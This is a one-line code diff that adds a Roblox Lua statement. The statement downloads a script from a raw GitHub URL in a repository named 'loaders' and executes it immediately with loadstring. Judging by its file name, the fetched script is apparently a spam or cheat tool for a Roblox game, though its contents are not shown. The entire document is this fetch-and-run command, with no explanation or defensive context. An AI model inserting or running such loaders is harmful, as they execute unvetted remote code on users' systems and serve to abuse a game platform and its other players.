@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/scrooms-spam3-q5i6f3gbm5ykei.lua"))()
